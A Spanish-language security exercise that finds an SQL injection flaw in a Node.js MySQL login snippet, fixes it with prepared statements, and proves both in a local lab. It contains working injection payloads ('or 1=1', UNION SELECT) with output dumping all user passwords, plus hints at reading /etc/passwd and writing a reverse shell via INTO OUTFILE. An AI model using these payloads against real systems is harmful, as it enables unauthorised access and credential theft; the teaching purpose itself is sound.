# EJERCICIO 5: SQLi

Analice el siguiente fragmento de código de backend en busca de algún problema, y en su caso indique cómo solucionarlo aportando una nueva versión de código. (Considere el código inicial libre de errores sintácticos).

```
const mysql = require('mysql');
const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'password',
    database: 'mydatabase'
});
connection.connect(err => {
    if (err) {
        console.error('Error connecting to database:', err);
        return;
    }
    const username = 'userInput';
    const password = 'userPassword';
    const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    connection.query(sql, (err, results) => {
        if (err) {
            console.error('Error executing query:', err);
            return;
        }
        if (results.length > 0) {
            console.log('Login successful!');
        } else {
            console.log('Invalid username or password.');
        }
    });
});
```

## Vulnerabilidad

A simple vista es un código en Javascript que realiza una conexión a una base de datos MySQL.
Al establecer la conexión vemos que el programador introduce una vulnerabilidade de SQLi en esta línea:

```
const sql = `SELECT * FROM users WHERE username = '${username}'
```

Una vulnerabilidad SQLi ocurre cuando se construye una cadena de conexión (en este código la constante "sql") de forma insegura, que permite manipular de forma arbitraria dicha cadena a través de la entrada aportada por el usuario (en este código las variables "username" y "password").

## Solución

La solución es utilizar consultas preparadas (Prepared Statements), de forma que las cadenas de entrada a la consulta no pueden modificar el comportamiento de la misma. Bastaría dos sencillos cambios para solucionarlo:

```
const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
connection.query(sql, [username, password], (err, results) => {
    ...
}
```

## Prueba de concepto de la vulnerabilidad

Preparamos entorno de pruebas:

```
sudo apt install nodejs npm
npm install mysql

sudo apt install default-mysql-server
sudo systemctl start mysql
```

Creamos el usuario y la base de datos de prueba (cambiamos en el código el usuario root por uno de pruebas):
```
sudo mysql

create database mydatabase;
create user 'test'@'localhost' identified by 'password';
grant all privileges on mydatabase.* to 'test'@'localhost';
flush privileges;

use mydatabase;
create table users (username varchar(255),password varchar(255));
insert into users values ('usuario1','password1');
insert into users values ('usuario2','password2');
```

En el código original hacemos algunos cambios mínimos para que funcione:
- Cambiamos localhost por 127.0.0.1
- Cambiamos root por test 
- Recibimos username y password por parámetros de entrada
- Imprimimos la sentencia SQL 
- Imprimimos los resultados que devuelve la consulta

```
const mysql = require('mysql');
const connection = mysql.createConnection({
    host: '127.0.0.1',
    user: 'test',
    password: 'password',
    database: 'mydatabase'
});
connection.connect(err => {
    if (err) {
        console.error('Error connecting to database:', err);
        return;
    }
    const username = process.argv[2];
    const password = process.argv[3];
    const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    console.log(sql);
    connection.query(sql, (err, results) => {
        if (err) {
            console.error('Error executing query:', err);
            return;
        }
        if (results.length > 0) {
            console.log('Login successful!');
            console.log(results);
        } else {
            console.log('Invalid username or password.');
        }
    });
});
```


Ejecutamos con un usuario y contraseñas conocidos:

```
node sqli_modificado.js usuario1 password1

SELECT * FROM users WHERE username = 'usuario1' AND password = 'password1'
Login successful!
[ RowDataPacket { username: 'usuario1', password: 'password1' } ]
```

Ahora vamos a probar el test básico de SQLi poniendo una comilla simple, que como es de esperar en una aplicación vulnerable PETA:

```
node sqli_modificado.js usuario1 "' or 1=1 --"
SELECT * FROM users WHERE username = 'usuario1' AND password = '' or 1=1 --'
Error executing query: Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
    at Sequence._packetToError (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/sequences/Sequence.js:47:14)
    at Query.ErrorPacket (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/sequences/Query.js:79:18)
    at Protocol._parsePacket (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Protocol.js:291:23)
    at Parser._parsePacket (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Parser.js:433:10)
    at Parser.write (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Parser.js:43:10)
    at Protocol.write (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Protocol.js:38:16)
    at Socket.<anonymous> (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/Connection.js:88:28)
    at Socket.<anonymous> (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/Connection.js:526:10)
    at Socket.emit (node:events:517:28)
    at addChunk (node:internal/streams/readable:368:12)
    --------------------
    at Protocol._enqueue (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Protocol.js:144:48)
    at Connection.query (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/Connection.js:198:25)
    at Handshake.<anonymous> (/mnt/hgfs/compartida/_borralla/ros/sqli_modificado.js:17:16)
    at Handshake.<anonymous> (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/Connection.js:526:10)
    at Handshake._callback (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/Connection.js:488:16)
    at Sequence.end (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/sequences/Sequence.js:83:24)
    at Sequence.OkPacket (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/sequences/Sequence.js:92:8)
    at Protocol._parsePacket (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Protocol.js:291:23)
    at Parser._parsePacket (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Parser.js:433:10)
    at Parser.write (/mnt/hgfs/compartida/_borralla/ros/node_modules/mysql/lib/protocol/Parser.js:43:10) {
  code: 'ER_PARSE_ERROR',
  errno: 1064,
  sqlMessage: "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1",
  sqlState: '42000',
  index: 0,
  sql: "SELECT * FROM users WHERE username = 'usuario1' AND password = '' or 1=1 --'"
}
```

Y con esto sacamos todos los usuarios y password de la BD:

```
node sqli_modificado.js usuario1 "' or 1=1 -- "

SELECT * FROM users WHERE username = 'usuario1' AND password = '' or 1=1 -- '
Login successful!
[
  RowDataPacket { username: 'usuario1', password: 'password1' },
  RowDataPacket { username: 'usuario2', password: 'password2' }
]

```

Con esto empezamos a exfiltrar otro tipo de información:

```
node sqli_modificado.js whatever "' union all select 1,2 -- "

SELECT * FROM users WHERE username = 'whatever' AND password = '' union all select 1,2 -- '
Login successful!
[ RowDataPacket { username: '1', password: '2' } ]
```


Y con esto el usuario con el que estamos conectados a la BD:

```
node sqli_modificado.js whatever "' union all select user(),system_user() -- " 

SELECT * FROM users WHERE username = 'whatever' AND password = '' union all select user(),system_user() -- '
Login successful!
[
  RowDataPacket {
    username: 'test@localhost',
    password: 'test@localhost'
  }
]
```

A partir de aquí es cuestión de seguir tirando del hilo. 
En función de los permisos que tenga el usuario "test" en nuestro MySQL, podríamos llegar a comprometer completamente el sistema:
- Si puede leer ficheros del sistema local: SELECT LOAD_FILE(‘/etc/passwd’) 
- Si puede escribir en algunas rutas: SELECT 'REVSHELL' INTO OUTFILE 'PATH' 
- Etc...


# Prueba de concepto de la solución

Sobre nuestro script modificado vulnerable, hacemos los cambios oportunos para solucionar la vulnerabilidad:

```
const mysql = require('mysql');
const connection = mysql.createConnection({
    host: '127.0.0.1',
    user: 'test',
    password: 'password',
    database: 'mydatabase'
});
connection.connect(err => {
    if (err) {
        console.error('Error connecting to database:', err);
        return;
    }
    const username = process.argv[2];
    const password = process.argv[3];
    const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
    console.log(sql);
    connection.query(sql, [username, password], (err, results) => {
        if (err) {
            console.error('Error executing query:', err);
            return;
        }
        if (results.length > 0) {
            console.log('Login successful!');
            console.log(results);
        } else {
            console.log('Invalid username or password.');
        }
    });
});
```

Ejecutamos con un payload anterior que explotaba la vulnerabilidad y vemos que no es vulnerable.

```
node sqli_modificado_novulnerable.js usuario1 "' or 1=1 -- " 

SELECT * FROM users WHERE username = ? AND password = ?
Invalid username or password.
```
